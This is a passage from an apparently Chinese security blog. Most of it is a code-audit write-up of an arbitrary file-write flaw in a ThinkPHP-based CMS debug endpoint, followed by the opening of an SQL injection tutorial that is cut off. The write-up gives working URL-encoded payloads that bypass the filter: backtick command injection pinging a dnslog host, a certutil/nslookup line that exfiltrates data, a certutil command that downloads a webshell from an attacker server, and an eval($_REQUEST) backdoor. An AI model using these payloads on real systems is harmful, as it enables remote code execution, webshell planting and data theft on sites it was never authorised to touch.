src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972430124-8e7c7656-9fa6-4359-a4e3-6543904ec4ce.png#align=left&display=inline&height=281&margin=%5Bobject%2Object%5D&name=image.png&originHeight=562&originWidth=956&size=48969&status=done&style=none&width=478\" alt=\"image.png\"><br>在\\thinkphp\\base.php文件中也可以看到对应的tp版本号（5.0.24版本好像有个反序列化，其实也可以尝试一下）<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972568248-ebb5d28f-a552-4570-92f2-57121b18ba68.png#align=left&display=inline&height=301&margin=%5Bobject%2Object%5D&name=image.png&originHeight=602&originWidth=1238&size=96549&status=done&style=none&width=619\" alt=\"image.png\"><br>虽然seay用现有的规则扫描扫出来的漏洞不太准确，但是帮忙定位危险函数还是可以的，所以我一般都会先进行自动审计。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972380570-1f206c81-580c-4d1c-bd47-71132c722f9b.png#align=left&display=inline&height=652&margin=%5Bobject%2Object%5D&name=image.png&originHeight=1304&originWidth=2424&size=273863&status=done&style=none&width=1212\" alt=\"image.png\"><br>接下来就是一个个漏洞分析了，都点进去看一看。<br>其实只需要看2点：<br>1.用户可以控制输入的内容<br>2.输入的内容被放到危险函数中进行了执行<br>(需要进行流程跟进的话还是推荐使用phpstorm工具的，我这里因为是在虚拟机中，就简单用了seay和nopad++代替)</p>\n<h1 id=\"0x04-漏洞点分析\"><a href=\"#0x04-漏洞点分析\" class=\"headerlink\" title=\"0x04 漏洞点分析\"></a>0x04 漏洞点分析</h1><p>1、具体我发现这个漏洞是在/app/admin/controller/api.php文件下的debug函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627972756885-5eac5c3d-6c8e-46ff-9a13-4914400c87c7.png#align=left&display=inline&height=331&margin=%5Bobject%2Object%5D&name=image.png&originHeight=662&originWidth=1360&size=59767&status=done&style=none&width=680\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"function\"><span class=\"keyword\">function</span> <span class=\"title\">debug</span>(<span class=\"params\"></span>)</span></span><br><span class=\"line\"><span class=\"function\">    </span>&#123;</span><br><span class=\"line\">        <span class=\"variable\">$path</span> = <span class=\"string\">&#x27;app/extra/debug.php&#x27;</span>;</span><br><span class=\"line\">        <span class=\"variable\">$file</span> = <span class=\"keyword\">include</span> <span class=\"variable\">$path</span>; </span><br><span class=\"line\">        <span class=\"variable\">$config</span> = <span class=\"keyword\">array</span>(</span><br><span class=\"line\">         <span class=\"string\">&#x27;name&#x27;</span> =&gt; input(<span class=\"string\">&#x27;id&#x27;</span>),</span><br><span class=\"line\">        );</span><br><span class=\"line\">        <span class=\"variable\">$config</span> = preg_replace(<span class=\"string\">&quot;/[?&gt;&lt;?]/&quot;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$config</span>);</span><br><span class=\"line\">        <span class=\"variable\">$res</span> = array_merge(<span class=\"variable\">$file</span>, <span class=\"variable\">$config</span>);</span><br><span class=\"line\">        <span class=\"variable\">$str</span> = <span class=\"string\">&#x27;&lt;?php return [&#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">foreach</span> (<span class=\"variable\">$res</span> <span class=\"keyword\">as</span> <span class=\"variable\">$key</span> =&gt; <span class=\"variable\">$value</span>) &#123;</span><br><span class=\"line\">            <span class=\"variable\">$str</span> .= <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"variable\">$key</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"string\">&#x27;=&gt;&#x27;</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"variable\">$value</span> . <span class=\"string\">&#x27;\\&#x27;&#x27;</span> . <span class=\"string\">&#x27;,&#x27;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"variable\">$str</span> .= <span class=\"string\">&#x27;]; &#x27;</span>;</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (file_put_contents(<span class=\"variable\">$path</span>, <span class=\"variable\">$str</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;code&#x27;</span> =&gt; <span class=\"number\">1</span>, <span class=\"string\">&#x27;msg&#x27;</span> =&gt; <span class=\"string\">&#x27;操作成功&#x27;</span>));</span><br><span class=\"line\">        &#125; <span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> json(<span class=\"keyword\">array</span>(<span class=\"string\">&#x27;code&#x27;</span> =&gt; <span class=\"number\">0</span>, <span class=\"string\">&#x27;msg&#x27;</span> =&gt; <span class=\"string\">&#x27;操作失败&#x27;</span>));</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br></pre></td></tr></table></figure>\n<p>在代码第15行通过file_put_contents()函数将id传参的内容写入到app/extra/debug.php文件中。<br>2、可以看到上面进行了一些过滤，将&lt;&gt;和?替换为空</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$config</span> = preg_replace(<span class=\"string\">&quot;/[?&gt;&lt;?]/&quot;</span>, <span class=\"string\">&#x27;&#x27;</span>, <span class=\"variable\">$config</span>);</span><br></pre></td></tr></table></figure>\n<p>3、这里直接将不太清晰，实战演示一下，首先访问后台路径，这里有个debug功能，就是上面debug函数的功能点。<br><a href=\"http://127.0.0.1/index.php/admin/\">http://127.0.0.1/index.php/admin/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973358124-c7069db1-627c-4b05-8d15-255493426fee.png#align=left&display=inline&height=378&margin=%5Bobject%2Object%5D&name=image.png&originHeight=756&originWidth=2250&size=114711&status=done&style=none&width=1125\" alt=\"image.png\"><br>4、具体使用时发现报错了，那就直接访问对应的函数，路由规则就是/index.php/目录-文件-函数.html?传参=。<br>这里我传参123进行测试<br><a href=\"http://127.0.0.1/index.php/admin-api-debug.html?id=123\">http://127.0.0.1/index.php/admin-api-debug.html?id=123</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973462857-ae631d20-59ff-4a98-bb1d-6702c09d8311.png#align=left&display=inline&height=227&margin=%5Bobject%2Object%5D&name=image.png&originHeight=454&originWidth=1120&size=27749&status=done&style=none&width=560\" alt=\"image.png\"><br>5、在debug.php文件中可以看到123是放到数组中的值处，而我们可以控制这里的值。<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973579521-fd2d20ba-4b8c-46b5-9edf-654fb073cfed.png#align=left&display=inline&height=97&margin=%5Bobject%2Object%5D&name=image.png&originHeight=194&originWidth=810&size=11511&status=done&style=none&width=405\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>,]; </span><br></pre></td></tr></table></figure>\n<p>6、下面讲解我进行绕过的思路以及遇到的坑。</p>\n<h1 id=\"0x05-绕过思路\"><a href=\"#0x05-绕过思路\" class=\"headerlink\" title=\"0x05 绕过思路\"></a>0x05 绕过思路</h1><h2 id=\"第一次踩坑\"><a href=\"#第一次踩坑\" class=\"headerlink\" title=\"第一次踩坑\"></a>第一次踩坑</h2><p>1、首先，这里因为没有过滤单引号和中括号，所以我们可以手动闭合</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">payload:</span><br><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27];phpinfo();//</span></span><br></pre></td></tr></table></figure>\n<p>这里可以看到数据是成功写入进文件中的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973910607-7d1ffe2f-30b8-406c-9ec6-a7f233aa1838.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1138&size=17735&status=done&style=none&width=569\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>];phpinfo();<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>2、访问debug.php文件试试发现，页面并没有返回想要的内容<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627973998766-06dfe807-2a84-4b08-9d12-f6f666c5d553.png#align=left&display=inline&height=363&margin=%5Bobject%2Object%5D&name=image.png&originHeight=726&originWidth=1882&size=36793&status=done&style=none&width=941\" alt=\"image.png\"><br>3、这里我想了好久，想着试试更换echo输出看看<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974252476-7716d00d-14a0-4716-b201-a544a6f60a7b.png#align=left&display=inline&height=131&margin=%5Bobject%2Object%5D&name=image.png&originHeight=262&originWidth=1216&size=17745&status=done&style=none&width=608\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>];<span class=\"keyword\">echo</span> <span class=\"string\">&#x27;12344321&#x27;</span>;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>在页面中并没有输出<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974272002-aae9ec72-7aef-4da2-9334-3b1d52dd1fdc.png#align=left&display=inline&height=349&margin=%5Bobject%2Object%5D&name=image.png&originHeight=698&originWidth=1572&size=32195&status=done&style=none&width=786\" alt=\"image.png\"><br>4、查阅资料之后理解了return后代码不再向下执行，此路不通<br>参考链接：<a href=\"https://www.cnblogs.com/gzpu/p/13736420.html\">https://www.cnblogs.com/gzpu/p/13736420.html</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974368673-8697062b-c811-4893-8104-93859af43ce4.png#align=left&display=inline&height=360&margin=%5Bobject%2Object%5D&name=image.png&originHeight=720&originWidth=1780&size=173801&status=done&style=none&width=890\" alt=\"image.png\"></p>\n<h2 id=\"第二次踩坑\"><a href=\"#第二次踩坑\" class=\"headerlink\" title=\"第二次踩坑\"></a>第二次踩坑</h2><p>1、既然不能通过分号结束代码后执行其他代码的话，我能不能在return中执行代码呢，此处进行了尝试<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974559232-6d36dadf-930e-47a1-9480-1ec1a7fedfff.png#align=left&display=inline&height=166&margin=%5Bobject%2Object%5D&name=image.png&originHeight=332&originWidth=1320&size=21063&status=done&style=none&width=660\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>,<span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">1</span>]);<span class=\"string\">&#x27;&#x27;</span>,]; </span><br></pre></td></tr></table></figure>\n<p>于是……页面报错了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974695282-85560a7a-e2ed-420b-a587-3fca009fce13.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948\" alt=\"image.png\"><br>2、再试试换行</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27,%0aeval($_REQUEST[1]);%27</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974633748-97685352-f49d-473f-8a3b-2bee5cd0f9f9.png#align=left&display=inline&height=255&margin=%5Bobject%2Object%5D&name=image.png&originHeight=510&originWidth=1766&size=41682&status=done&style=none&width=883\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974665241-8ade3301-0ef4-4c8e-81c7-ed35aaf695d6.png#align=left&display=inline&height=149&margin=%5Bobject%2Object%5D&name=image.png&originHeight=298&originWidth=774&size=17721&status=done&style=none&width=387\" alt=\"image.png\"><br>好的，还是不执行<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974689654-d9f1edad-993c-47cf-bd87-4a90e81ca765.png#align=left&display=inline&height=208&margin=%5Bobject%2Object%5D&name=image.png&originHeight=416&originWidth=1896&size=51008&status=done&style=none&width=948\" alt=\"image.png\"></p>\n<h2 id=\"第三次，渐渐好起来了\"><a href=\"#第三次，渐渐好起来了\" class=\"headerlink\" title=\"第三次，渐渐好起来了\"></a>第三次，渐渐好起来了</h2><p>1、因为代码执行行不通，那我就想着试试命令执行看可不可以。先申请一个dnslog，链接：<a href=\"http://dnslog.cn/\">http://dnslog.cn/</a><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975381688-d15ad1b7-76f1-415d-bcd7-e22aa5ba1eb6.png#align=left&display=inline&height=368&margin=%5Bobject%2Object%5D&name=image.png&originHeight=736&originWidth=1678&size=96742&status=done&style=none&width=839\" alt=\"image.png\"><br>2、使用.拼接反引号执行命令</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27].`ping%20123.yh6nta.dnslog.cn`;//</span></span><br></pre></td></tr></table></figure>\n<p>查看文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975963563-5fcf69e0-c0a5-4b5c-a539-91dc15f8ed2b.png#align=left&display=inline&height=130&margin=%5Bobject%2Object%5D&name=image.png&originHeight=260&originWidth=1520&size=21022&status=done&style=none&width=760\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>].`ping <span class=\"number\">123</span>.yh6nta.dnslog.cn`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>访问看看，发现报错了，但是dnslog记录了数据，命令执行成功了<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627975999637-a25ee21b-1180-4e35-b011-5cfd6aa1b280.png#align=left&display=inline&height=205&margin=%5Bobject%2Object%5D&name=image.png&originHeight=410&originWidth=1638&size=42918&status=done&style=none&width=819\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976022017-93c02bcb-6de0-4975-9a73-97abf75fcd0d.png#align=left&display=inline&height=243&margin=%5Bobject%2Object%5D&name=image.png&originHeight=486&originWidth=1562&size=52679&status=done&style=none&width=781\" alt=\"image.png\"></p>\n<p>3、这里报错怀疑是使用了点进行拼接，两边的字符类型不匹配，因为命令执行可以使用符号进行连接，所以在这里将点替换成&amp;。<br>因为&amp;在url中还有其他含义，所以先进行url编码。</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span><span class=\"string\">&#x27;]&amp;`ping 123.yh6nta.dnslog.cn`;//</span></span><br><span class=\"line\"><span class=\"string\">#url编码</span></span><br><span class=\"line\"><span class=\"string\">123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%60ping%20123.yh6nta.dnslog.cn%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p>查看文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976148195-6af4632a-25e2-4522-b675-1534d18406cb.png#align=left&display=inline&height=157&margin=%5Bobject%2Object%5D&name=image.png&originHeight=314&originWidth=1460&size=22879&status=done&style=none&width=730\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;`ping <span class=\"number\">123</span>.yh6nta.dnslog.cn`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>访问debug.php文件，页面没有报错，而且dnslog成功回显<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976190829-597fc4be-908f-4c66-a852-bdc93422099e.png#align=left&display=inline&height=212&margin=%5Bobject%2Object%5D&name=image.png&originHeight=424&originWidth=1048&size=19358&status=done&style=none&width=524\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627976225056-8a0f56dd-89e0-44fd-8bda-f6c928a1ffb3.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1636&size=71050&status=done&style=none&width=818\" alt=\"image.png\"><br>4、既然可以执行命令了，很明显这里是无回显的情况，那么怎么拿到shell呢<br>PHP无回显情况下的渗透测试可以参考此文章：<br><a href=\"https://xz.aliyun.com/t/9916\">https://xz.aliyun.com/t/9916</a></p>\n<h3 id=\"Linux系统\"><a href=\"#Linux系统\" class=\"headerlink\" title=\"Linux系统\"></a>Linux系统</h3><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">这里不细说，只要命令没有&lt;、&gt;、?即可</span><br><span class=\"line\"><span class=\"number\">1</span>、nc反弹shell</span><br><span class=\"line\"><span class=\"number\">2</span>、配合其他组件，如redis等</span><br><span class=\"line\"><span class=\"number\">3</span>、等等～</span><br></pre></td></tr></table></figure>\n<h3 id=\"Windows系统\"><a href=\"#Windows系统\" class=\"headerlink\" title=\"Windows系统\"></a>Windows系统</h3><h4 id=\"1、第一次尝试\"><a href=\"#1、第一次尝试\" class=\"headerlink\" title=\"1、第一次尝试\"></a>1、第一次尝试</h4><figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">使用`ping `whoami`.yh6nta.dnslog.cn`，失败</span><br><span class=\"line\">使用`ping /`whoami/`.yh6nta.dnslog.cn`，失败</span><br><span class=\"line\">使用`ping %系统变量%.yh6nta.dnslog.cn`，失败</span><br></pre></td></tr></table></figure>\n<h4 id=\"2、第二次尝试\"><a href=\"#2、第二次尝试\" class=\"headerlink\" title=\"2、第二次尝试\"></a>2、第二次尝试</h4><p>使用系统命令外带数据，首先我在文件中直接修改，发现可以成功外带数据</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;`cmd /c whoami &gt; temp &amp;&amp; certutil -encode -f temp temp&amp;&amp;<span class=\"keyword\">FOR</span> /F <span class=\"string\">&quot;eol=- delims=&quot;</span> %i IN (temp) <span class=\"keyword\">DO</span> (set _=%i &amp; cmd /c nslookup %_:~<span class=\"number\">0</span>,-<span class=\"number\">1</span>%.yh6nta.dnslog.cn)&amp;del temp`;<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977290414-50582704-a650-4082-a41a-cf9a1665b9b9.png#align=left&display=inline&height=207&margin=%5Bobject%2Object%5D&name=image.png&originHeight=414&originWidth=1540&size=39360&status=done&style=none&width=770\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977306573-d1cd453b-5141-4d0b-9168-b691f744965b.png#align=left&display=inline&height=146&margin=%5Bobject%2Object%5D&name=image.png&originHeight=292&originWidth=1470&size=47685&status=done&style=none&width=735\" alt=\"image.png\"><br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977330429-234914f7-3549-4c6c-a3b9-6167a5649897.png#align=left&display=inline&height=338&margin=%5Bobject%2Object%5D&name=image.png&originHeight=676&originWidth=1130&size=61783&status=done&style=none&width=565\" alt=\"image.png\"><br>后面发现，这条命令中含有一个&gt;号，苦恼好久，暂时放弃。不过我觉得这个命令可以适当优化，然后就可以使用了。</p>\n<h4 id=\"3、第三次尝试，成功getshell\"><a href=\"#3、第三次尝试，成功getshell\" class=\"headerlink\" title=\"3、第三次尝试，成功getshell\"></a>3、第三次尝试，成功getshell</h4><p>这里借鉴了XX师傅的建议，通过命令下载文件getshell</p>\n<p>1、首先需要准备一个文件，内容为一句话木马，放到vps的web服务中。（当然起一个python的http服务也可以，主要是要可以访问获取。）</p>\n<p>2、windows中可以使用certutil下载文件</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">#payload：</span></span><br><span class=\"line\"><span class=\"string\">&#x27;]&amp;`certutil -urlcache -split -f http://vps地址:83/shell 1.php`;//</span></span><br><span class=\"line\"><span class=\"string\">#url编码：</span></span><br><span class=\"line\"><span class=\"string\">%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F</span></span><br><span class=\"line\"><span class=\"string\">#通过id传参：</span></span><br><span class=\"line\"><span class=\"string\">http://127.0.0.1/index.php/admin-api-debug.html?id=%27%5D%26%60certutil%20-urlcache%20-split%20-f%20http%3A%2F%2Fvps地址%3A83%2Fshell%201.php%60%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977842733-531b6b12-9c1d-437f-b7eb-43c9f4d2f586.png#align=left&display=inline&height=324&margin=%5Bobject%2Object%5D&name=image.png&originHeight=648&originWidth=1924&size=52188&status=done&style=none&width=962\" alt=\"image.png\"><br>3、查看debug.php文件情况<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627977879453-9011b19e-b726-40d9-8d0b-d2f3f11814b6.png#align=left&display=inline&height=170&margin=%5Bobject%2Object%5D&name=image.png&originHeight=340&originWidth=1370&size=27921&status=done&style=none&width=685\" alt=\"image.png\"><br>4、访问debug.php后，会在当前目录生成1.php，内容为一句话木马<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978056537-80fdfb3f-2da0-4272-86ce-13fc3301fe3c.png#align=left&display=inline&height=270&margin=%5Bobject%2Object%5D&name=image.png&originHeight=540&originWidth=1340&size=52951&status=done&style=none&width=670\" alt=\"image.png\"><br>5、执行phpinfo函数<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627978130967-fe3d3a57-3439-4ae1-93af-1f1c0df55acb.png#align=left&display=inline&height=423&margin=%5Bobject%2Object%5D&name=image.png&originHeight=846&originWidth=2230&size=218961&status=done&style=none&width=1115\" alt=\"image.png\"></p>\n<h2 id=\"原来竟然如此简单？\"><a href=\"#原来竟然如此简单？\" class=\"headerlink\" title=\"原来竟然如此简单？\"></a>原来竟然如此简单？</h2><p>1、因为前面命令执行可以使用符号进行连接，我想着在代码中也试试，看看能不能直接执行一句话木马（测试了｜、｜｜、&amp;、&amp;&amp;，只有&amp;和&amp;&amp;的时候可以执行）<br>同样先进行url编码</p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">123</span><span class=\"string\">&#x27;]&amp;&amp;eval($_REQUEST[1]);//</span></span><br><span class=\"line\"><span class=\"string\">#url编码</span></span><br><span class=\"line\"><span class=\"string\">123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">http:<span class=\"comment\">//127.0.0.1/index.php/admin-api-debug.html?id=123%27%5D%26%26eval(%24_REQUEST%5B1%5D)%3B%2F%2F</span></span><br></pre></td></tr></table></figure>\n<p><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974884495-55623576-d417-48df-b872-bf0ba605d607.png#align=left&display=inline&height=248&margin=%5Bobject%2Object%5D&name=image.png&originHeight=496&originWidth=1940&size=47452&status=done&style=none&width=970\" alt=\"image.png\"><br>在文件中是这样的<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974919229-adbc9a6d-0ff1-4971-96e4-a0a08b7064a5.png#align=left&display=inline&height=123&margin=%5Bobject%2Object%5D&name=image.png&originHeight=246&originWidth=1288&size=19624&status=done&style=none&width=644\" alt=\"image.png\"></p>\n<figure class=\"highlight php\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"meta\">&lt;?php</span> <span class=\"keyword\">return</span> [<span class=\"string\">&#x27;name&#x27;</span>=&gt;<span class=\"string\">&#x27;123&#x27;</span>]&amp;&amp;<span class=\"keyword\">eval</span>(<span class=\"variable\">$_REQUEST</span>[<span class=\"number\">1</span>]);<span class=\"comment\">//&#x27;,]; </span></span><br></pre></td></tr></table></figure>\n<p>尝试访问，成功执行代码<br><img src=\"https://cdn.nlark.com/yuque/0/2021/png/12366538/1627974971491-f1514597-7cb7-43ac-a727-8c191adf1d0e.png#align=left&display=inline&height=497&margin=%5Bobject%2Object%5D&name=image.png&originHeight=994&originWidth=2474&size=252996&status=done&style=none&width=1237\" alt=\"image.png\"><br>居然就这样就可以了……</p>\n<h1 id=\"0x06-总结\"><a href=\"#0x06-总结\" class=\"headerlink\" title=\"0x06 总结\"></a>0x06 总结</h1><p>本次代码审计发现漏洞很快，但是利用起来整了我2天，还是在师傅们的帮助下完成的深入利用。忽然发现自己对于编程语言的基础还很不扎实，一些简单处理的地方居然思考了那么久，在之前发现漏洞的情况下，一般都是可以直接利用了，此次bypass的时候发现了很多不足。在以后的代码审计中，简单利用的漏洞只会越来越少，我还需要多深入学习代码知识，才能从一些过滤薄弱点出发，发现漏洞。嗯嗯，总结一句话，不论是学什么东西，基础很重要很重要！</p>\n"},{"title":"sql注入之重新学习","ccategories":"web安全","keywords":"web安全,sql注入,显错注入,报错注入,盲注,宽字节注入","description":"基于mysql进行sql注入的全方位讲解","cover":"/images/sql.jpeg","date":"2020-09-02T02:45:41.000Z","_content":"\n<meta name=\"referrer\" content=\"no-referrer\"/>\n\n## SQL注入\n\n### 概念：\nSQL注入即是指web应用程序对用户输入数据的合法性没有判断或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句的结尾上添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询，从而进一步得到相应的数据信息。\n在owasp top 10常年霸占榜首漏洞的位置，可以当之无愧称它为漏洞之王。SQL注入是一个通过拼接sql查询语句获取数据库里面的数据的漏洞。常见的漏洞点为url中带有的id传参，如[http://www.xxx.com/i.php?id=13](http://www.xxx.com/i.php?id=13)。\n此处的13会通过php传参传到数据库进行查询，一般的查询语句为:select * from news where 